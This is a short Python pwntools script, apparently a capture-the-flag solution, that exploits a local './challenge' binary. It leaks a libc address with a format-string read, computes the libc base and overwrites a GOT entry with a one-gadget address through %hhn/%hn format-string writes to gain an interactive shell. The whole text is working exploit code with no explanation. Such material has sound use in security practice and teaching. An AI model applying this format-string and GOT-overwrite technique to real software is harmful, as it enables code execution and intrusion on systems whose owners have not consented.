from pwn import *

target=process('./challenge')
elf=ELF('./challenge')
libc=elf.libc

context.terminal=["tmux","split","-h"]
#gdb.attach(target)

print(target.recvuntil("> "))
target.sendline("1")
print(target.recvuntil("add? "))

flush_got=0x602040
writeaddr1=0x602040
writeaddr2=0x602042
target.sendline(p64(writeaddr1)+p64(writeaddr2))

print(target.recvuntil("> "))
target.sendline("3")
print(target.recvuntil("item? "))
target.sendline("1")
print(target.recvuntil("value? "))
fs="%653$#018lx"
target.sendline(fs)
print(target.recvuntil("Value: "))
leak=target.recv()[0:18]


libc_start_main=int(leak,16)-235
libc_base=libc_start_main-libc.symbols["__libc_start_main"]
print(hex(libc_base))

gadget=0xe922b
libc_gadget=libc_base+gadget
print(hex(libc_gadget))
libc_putchar=libc_base+libc.symbols["putchar"]
print(hex(libc_putchar))

hex_libc_gadget=hex(libc_gadget)

n0=int(hex_libc_gadget[10:14],16)
n1=int(hex_libc_gadget[8:10],16)
print(hex(n0))
print(hex(n1))

target.sendline("3")
print(target.recvuntil("item? "))
target.sendline("1")
print(target.recvuntil("value? "))


fs="%0"+str(n1)+"x"+"%11$hhn"+"%0"+str(n0-n1)+"x"+"%10$hn"
target.sendline(fs)
print(target.recv())
target.interactive()
